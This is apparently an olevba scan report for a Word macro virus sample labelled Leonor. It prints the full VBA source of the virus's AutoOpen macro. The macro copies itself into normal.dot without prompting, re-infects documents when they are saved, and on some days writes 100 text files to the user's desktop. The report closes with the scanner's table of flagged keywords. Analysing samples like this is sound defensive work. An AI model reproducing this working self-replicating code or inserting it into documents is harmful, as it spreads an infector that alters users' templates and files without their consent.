olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Leonor
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Leonor - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: ./Virus.MSWord.Leonor - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Cierra todas las ventanas del documento activo."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
Dim normal$
Dim fichero$
Dim contador
Dim BuscarMacro$
Dim comprueba
Dim bandera
Dim Dia
Dim Numero
Dim repite
Dim repetidor$
Dim AutoOpen$
'Leonor macro (v1.1) made by uhjov
normal$ = WordBasic.[DefaultDir$](2)
normal$ = normal$ + "\normal.dot"
SetAttr normal$, 0
fichero$ = WordBasic.[FileName$]()
For contador = 1 To WordBasic.CountMacros()
  BuscarMacro$ = WordBasic.[MacroName$](contador, 0)
  If BuscarMacro$ = "AutoOpen" Then comprueba = 1
Next
If comprueba <> 1 Then
  WordBasic.Organizer Copy:=1, Source:=fichero$, Destination:=normal$, _
  Name:="AutoOpen", Tab:=3
  WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
  WordBasic.FileSaveAll
  bandera = 1
  SetAttr normal$, 0
End If
If bandera <> 1 Then
  Dia = WordBasic.WeekDay(WordBasic.Today())
  Numero = WordBasic.Int(Rnd() * 100)
  If Dia = 2 Or Dia = 7 Then
    If Numero < 10 Then
      For repite = 1 To 100
        repetidor$ = "C:\windows\escritorio\" + WordBasic.[LTrim$](Str(repite)) _
        + ".txt"
        Open repetidor$ For Output As 1
        Print #1, "I love Leonor forever"
        Close 1
      Next
    End If
  End If
  If UCase(WordBasic.[MacroFileName$](AutoOpen$)) = UCase(normal$) Then
    
    
    
    
  '  WordBasic.FileSaveAs Format:=1
    WordBasic.Organizer Copy:=1, Source:=normal$, Destination:=fichero$, _
    Name:="AutoOpen", Tab:=3
    WordBasic.FileSaveAs Format:=1
  End If
End If
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

